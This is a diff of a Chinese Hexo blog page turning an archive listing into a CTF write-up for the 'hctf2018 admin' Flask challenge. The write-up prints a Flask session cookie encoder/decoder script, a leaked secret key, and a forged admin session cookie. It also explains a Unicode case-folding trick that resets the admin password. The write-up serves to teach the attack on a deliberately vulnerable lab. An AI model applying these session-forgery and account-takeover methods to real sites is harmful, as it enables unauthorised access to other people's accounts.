@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -21,9 +19,11 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive: 2021 - Hexo</title>
+  <title>hctf2018 admin - Hexo</title>
   
 
+  
+    <meta name="description" content="#前言又是一项大工程">
   
 
   <!-- feed -->
@@ -56,7 +56,7 @@
 <body>
   
 
-<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -307,7 +307,7 @@
     <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  dock' style="display: ;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -383,215 +383,480 @@
         
 
 <div class='l_main'>
-	
-		
-  <section class="post-list">
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
     
     
-      
+    
+      <h1 class="title">
+        hctf2018 admin
+      </h1>
+      <div class='new-meta-box'>
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/">
-        postbuu网鼎杯areunserialize
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>lucky</p>
+  </a>
+</div>
+
+          
         
+          
+            
 
-    &lt;?php
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Feb 8, 2021</p>
+  </a>
+</div>
 
-include(&quot;flag.php&quot;);
-
- highlight_file(__FILE__);
-
-class FileHandler &#123;
-
-protected $op;
-protected $filename;
-protected $content;//类型为protected
-
-function __construct() &...
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
       
-    
+      <div id="lc-pv" data-title="hctf2018 admin" data-path="/2021/02/08/admin/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-18</time>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <p>#前言<br>又是一项大工程</p>
+<a id="more"></a>
+
+<p>看了一下有login，register，posts（发post），chenge password，logout。然后注册的时候，我试了下admin，说是这个admin，已经被注册过了，并且注释了也有说，你不是admin。然后我是想，把admin所对应的密码爆出来，但是没成功，就没办法了。应该不像是万能密码之类的。<br>哦，不是爆不出来，是密码字典不行，密码123，登上去就直接出来flag<br><br>看wp<br><br>因为有change password的功能，可能可以通过修改密码的功能改掉admin的密码，然后以admin登录。在change password的源代码处，发现有一个<a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/%EF%BC%8C">https://github.com/woadsl1234/hctf_flask/，</a><br><br>这是一个flask项目，代码结构简单如下图。</p>
+<p><img src="1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,666"></p>
+<p>flask项目，就先去路由去看一下，打开route.py,看一下index的注册函数代码。</p>
+<pre><code> @app.route(&#39;/&#39;)
+@app.route(&#39;/index&#39;)
+def index():
+return render_template(&#39;index.html&#39;, title = &#39;hctf&#39;)</code></pre>
+<p>发现index的注册码没有做什么处理，那就直接返回index.html渲染模板，于是我们看一下templates/index.html代码。</p>
+<pre><code>&#123;% include('header.html') %&#125;
+&#123;% if current_user.is_authenticated %&#125;
+    <h1 class="nav">Hello &#123;&#123; session['name'] &#125;&#125;</h1>
+    &#123;% endif %&#125;
+&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;
+    <h1 class="nav">hctf&#123;xxxxxxxxx&#125;</h1>
+    &#123;% endif %&#125;
+&lt;!-- you are not admin --&gt;
+&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;
+
+&#123;% include('footer.html') %&#125;</code></pre>
+<p>从上述代码可以看出，只有登录admin才可以得到flag。于是继续看向route.py文件，看看login和change password地注册函数嘛是怎么写的。route,py部分代码如下：</p>
+<pre><code>   @app.route(&#39;/register&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])</code></pre>
+<p>def register():</p>
+<pre><code>if current_user.is_authenticated:
+    return redirect(url_for(&#39;index&#39;))
+
+form = RegisterForm()
+if request.method == &#39;POST&#39;:
+    name = strlower(form.username.data)
+    if session.get(&#39;image&#39;).lower() != form.verify_code.data.lower():
+        flash(&#39;Wrong verify code.&#39;)
+        return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form=form)
+    if User.query.filter_by(username = name).first():
+        flash(&#39;The username has been registered&#39;)
+        return redirect(url_for(&#39;register&#39;))
+    user = User(username=name)
+    user.set_password(form.password.data)
+    db.session.add(user)
+    db.session.commit()
+    flash(&#39;register successful&#39;)
+    return redirect(url_for(&#39;login&#39;))
+return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form = form)
+
+@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def login():
+if current_user.is_authenticated:
+    return redirect(url_for(&#39;index&#39;))
+
+form = LoginForm()
+if request.method == &#39;POST&#39;:
+    name = strlower(form.username.data)
+    session[&#39;name&#39;] = name
+    user = User.query.filter_by(username=name).first()
+    if user is None or not user.check_password(form.password.data):
+        flash(&#39;Invalid username or password&#39;)
+        return redirect(url_for(&#39;login&#39;))
+    login_user(user, remember=form.remember_me.data)
+    return redirect(url_for(&#39;index&#39;))
+return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)
+
+@app.route(&#39;/logout&#39;)
+def logout():
+logout_user()
+return redirect(&#39;/index&#39;)
+
+@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def change():
+if not current_user.is_authenticated:
+    return redirect(url_for(&#39;login&#39;))
+form = NewpasswordForm()
+if request.method == &#39;POST&#39;:
+    name = strlower(session[&#39;name&#39;])
+    user = User.query.filter_by(username=name).first()
+    user.set_password(form.newpassword.data)
+    db.session.commit()
+    flash(&#39;change successful&#39;)
+    return redirect(url_for(&#39;index&#39;))
+return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre>
+<h1>解法一————flask session伪造</h1>
+
+<p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防止篡改，而无法防止被读取。而flask并没有提供加密操作，所以其所有的session的内容是可以在客户端被读取的，这也可以造成一些安全问题。<br>我们可以用python脚本把flask的session揭秘出来，但是如果想要加密成自己的session的话，还需要知道flask用来签名的<mark>secret_key</mark>,在github中找，可以在config.py里发现下面代码</p>
+<pre><code>   import os
+
+class Config(object):
+SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
+SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;
+SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre>
+<p>估计ckj123就是secret_key，所以session伪造这条路可以走，于是在github上找找看有没有flask session加密的脚本。</p>
+<p><img src="2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,666"></p>
+<p>把脚本down下来，然后执行，脚本代码如下。</p>
+<pre><code>flask_session_manager.py
+
+   &quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;
+__author__ = &#39;Wilson Sumanang, Alexandre ZANNI&#39;
+
+# standard imports
+import sys
+import zlib
+from itsdangerous import base64_decode
+import ast
+
+# Abstract Base Classes (PEP 3119)
+if sys.version_info[0] &lt; 3: # &lt; 3.0
+raise Exception(&#39;Must be using at least Python 3&#39;)
+elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4
+from abc import ABCMeta, abstractmethod
+else: # &gt; 3.4
+from abc import ABC, abstractmethod
+
+ # Lib for argument parsing
+import argparse
+
+# external Imports
+from flask.sessions import SecureCookieSessionInterface
+
+class MockApp(object):
+
+def __init__(self, secret_key):
+    self.secret_key = secret_key
+
+
+if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4
+class FSCM(metaclass=ABCMeta):
+    def encode(secret_key, session_cookie_structure):
+        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;
+        try:
+            app = MockApp(secret_key)
+
+            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+            si = SecureCookieSessionInterface()
+            s = si.get_signing_serializer(app)
+
+            return s.dumps(session_cookie_structure)
+        except Exception as e:
+            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)
+            raise e
+
+
+    def decode(session_cookie_value, secret_key=None):
+        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+        try:
+            if(secret_key==None):
+                compressed = False
+                payload = session_cookie_value
+
+                if payload.startswith(&#39;.&#39;):
+                    compressed = True
+                    payload = payload[1:]
+
+                data = payload.split(&quot;.&quot;)[0]
+
+                data = base64_decode(data)
+                if compressed:
+                    data = zlib.decompress(data)
+
+                return data
+            else:
+                app = MockApp(secret_key)
+
+                si = SecureCookieSessionInterface()
+                s = si.get_signing_serializer(app)
+
+                return s.loads(session_cookie_value)
+        except Exception as e:
+            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)
+            raise e
+else: # &gt; 3.4
+class FSCM(ABC):
+    def encode(secret_key, session_cookie_structure):
+        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;
+        try:
+            app = MockApp(secret_key)
+
+            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+            si = SecureCookieSessionInterface()
+            s = si.get_signing_serializer(app)
+
+            return s.dumps(session_cookie_structure)
+        except Exception as e:
+            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)
+            raise e
+
+
+    def decode(session_cookie_value, secret_key=None):
+        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+        try:
+            if(secret_key==None):
+                compressed = False
+                payload = session_cookie_value
+
+                if payload.startswith(&#39;.&#39;):
+                    compressed = True
+                    payload = payload[1:]
+
+                data = payload.split(&quot;.&quot;)[0]
+
+                data = base64_decode(data)
+                if compressed:
+                    data = zlib.decompress(data)
+
+                return data
+            else:
+                app = MockApp(secret_key)
+
+                si = SecureCookieSessionInterface()
+                s = si.get_signing_serializer(app)
+
+                return s.loads(session_cookie_value)
+        except Exception as e:
+            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)
+            raise e
+
+
+if __name__ == &quot;__main__&quot;:
+# Args are only relevant for __main__ usage
+
+## Description for help
+parser = argparse.ArgumentParser(
+            description=&#39;Flask Session Cookie Decoder/Encoder&#39;,
+            epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)
+
+## prepare sub commands
+subparsers = parser.add_subparsers(help=&#39;sub-command help&#39;, dest=&#39;subcommand&#39;)
+
+## create the parser for the encode command
+parser_encode = subparsers.add_parser(&#39;encode&#39;, help=&#39;encode&#39;)
+parser_encode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                            help=&#39;Secret key&#39;, required=True)
+parser_encode.add_argument(&#39;-t&#39;, &#39;--cookie-structure&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                            help=&#39;Session cookie structure&#39;, required=True)
+
+## create the parser for the decode command
+parser_decode = subparsers.add_parser(&#39;decode&#39;, help=&#39;decode&#39;)
+parser_decode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                            help=&#39;Secret key&#39;, required=False)
+parser_decode.add_argument(&#39;-c&#39;, &#39;--cookie-value&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                            help=&#39;Session cookie value&#39;, required=True)
+
+## get args
+args = parser.parse_args()
+
+## find the option chosen
+if(args.subcommand == &#39;encode&#39;):
+    if(args.secret_key is not None and args.cookie_structure is not None):
+        print(FSCM.encode(args.secret_key, args.cookie_structure))
+elif(args.subcommand == &#39;decode&#39;):
+    if(args.secret_key is not None and args.cookie_value is not None):
+        print(FSCM.decode(args.cookie_value,args.secret_key))
+    elif(args.cookie_value is not None):
+        print(FSCM.decode(args.cookie_value))</code></pre>
+<p>脚本有解密加密的作用，具体用法如下：</p>
+<li>解密：python flask_session_manager.py decode -c -s #-c是cookie里的session的值， -s是SECRET-KEY
+<li>加密：python flask_session_manager.py encode -s -t #-s是SECRET-KEY，-t是session的参照格式，也是session解密后的格式
+
+<p>我们把登录页面的cookie中的session复制下来：</p>
+<pre><code>  .eJw9j0FrwkAQhf9K2XMPZmMugofCakhgJmxYXWYvoqlNMnEstIXEFf97QwveHnyPj_fu6tC_q9VdvZzUSqGHDOMmBtl2IFYjFxH8bkJNsXJNSq6YUGCJhib0pVSm7IOxY3Ado-kuxNhXeT1nSpH3Ambu5nALbBfAkJAUGiIOFJsxcDmAFCnp0AVnR8y3HMzmBgYFtZ3QNAmwXYKDSH6XAZcMPGjgWoCbtXq8qub76-Pw8zmcr88LYEgTtxHy0FF8y2ieUfndAuYcZH8JOd1I6gFdm5KnGJgyGNd_ul6O7flp8vttQvafXI8yA5Woxy_gZmLE.YCEcrA.rHKFgybomMZRkOtrUtERWPlSF9M</code></pre>
+<p>解出来是</p>
+<pre><code> &#123;&#39;_id&#39;: b&#39;5c9713faa2d66231e17f3977a216c84615bf82bd40e8c48eb3b8dc46765f0384c2f44235bb633dc70f2d2b7cfae404acd1203f7d1475248133ae922c29624f27&#39;, &#39;csrf_token&#39;: b&#39;066b830fac09b5f9e4309feedf2bdd587af3f693&#39;, &#39;image&#39;: b&#39;YQua&#39;, &#39;name&#39;: &#39;1&#39;&#125;</code></pre>
+<p>然后将name:后面的1改为admin，进行加密，得到session。</p>
+<pre><code> .eJw9j0Frg0AQhf9K2XMPcY2XQA6FTURhRlZMltlLSE2qjhkLbUHdkP9eaSG3B9_j4727OnUXtbmrl3e1UeggwbALXvYtiNXIWQB3mFBTKKo6piqbUGCNhiZ0uRQm77yxo69aRtPeiLEr0nLJFCMfBczSTWH2bFfAEJFkGgL2FOrRc96DZDFp3_rKjpju2ZvdDAYFtZ3Q1BGwXUMFgdwhAc4ZuNfApQDXW_V4VfX318fp57O_Ds8LYEgTNwFS31J4S2iZUbjDCpbs5XjzKc0kZY9VE5Oj4JkSGLd_uk7OzfVpcsd9RPafDGdZgDpfpBvU4xdxz2Sc.YCEm7Q.qff8PxWgZCxrPTSvX8vQa94gv_0</code></pre>
+<p>后面应该就是改cookie，但是，我没有成功。很是i奇怪</p>
+<h1>unicode欺骗</h1>
+我们可以发现，不管是login，register还是change页面，只要是关于session【“name”】的操作，都会先用strlower函数将name转成小写，但是python里有自带的转小写的函数lower，这里重写了一个，可能有猫腻，于是找到了strlower函数的定义。
+
+<pre><code>    def strlower(username):
+username = nodeprep.prepare(username)
+return username</code></pre>
+<p>这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下nodeprep.prepare，找到一篇unicode安全的文章，<a target="_blank" rel="noopener" href="https://paper.tuisec.win/detail/a9ad1440249d95b">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
+<p>这里原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。</p>
+<p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。<br>用改的密码登录即可</p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/'>
-            Read More
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://ckylsy.github.io/2021/02/08/admin/>http://ckylsy.github.io/2021/02/08/admin/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-08T21:02:47+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 8, 2021</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
-    <h2 class="article-title" >
-      <a href="/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/">
-        反序列学习&buu刷题的第二天,CTFshow部分题目
-      </a>
-    </h2>
-  
-  <div class='md'>
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://ckylsy.github.io/2021/02/08/admin/&title=hctf2018 admin - Hexo&summary=#前言又是一项大工程"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
     
-      <p>#前言<br>以此用来记录学习反序列化的时候遇见的题目</p>
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ckylsy.github.io/2021/02/08/admin/&title=hctf2018 admin - Hexo&summary=#前言又是一项大工程"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://ckylsy.github.io/2021/02/08/admin/&title=hctf2018 admin - Hexo&summary=#前言又是一项大工程"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
+      
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
+</div>
+
+
+
         
-        <time>2021-01-17</time>
-        
-      </div>
       
-        <div>
-          <a class='readmore' href='/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/'>
-            Read More
-          </a>
-        </div>
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/02/08/buyflag/'>
+          <p class='title'>buyflag<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+知识点
+cookie权限，这道题bp抓包后，有提示说是一定要是cuit的学生才可以去buyflag，并且可以发现cookie这里有：user=0，我们都知道在计算机中1是正确，0是错误，所以...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/">
-        buu学习第二天
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>buu的第二天的学习。</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-16</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/15/up/">
-        buu warm up
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>开启buu刷题之路</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-15</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/01/15/up/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/archives/2021/page/2/">
-            <section class="post prev white-box shadow" >
-              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          3 / 3
-        </p>
-        
-      </div>
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -599,87 +864,28 @@ function __construct() &...
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
+  <header>
     
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
 
-  
 
-  
-    
-    
+    <div class='content'>
+        
+    </div>
+  </section>
 
-  
 
   
 
 
 </aside>
+
 
 
         
@@ -689,14 +895,14 @@ function __construct() &...
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="hctf2018 admin";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
   var l_header=document.getElementById("l_header");
   
-  l_header.classList.remove("show");
+  l_header.classList.add("show");
   
 </script>
 
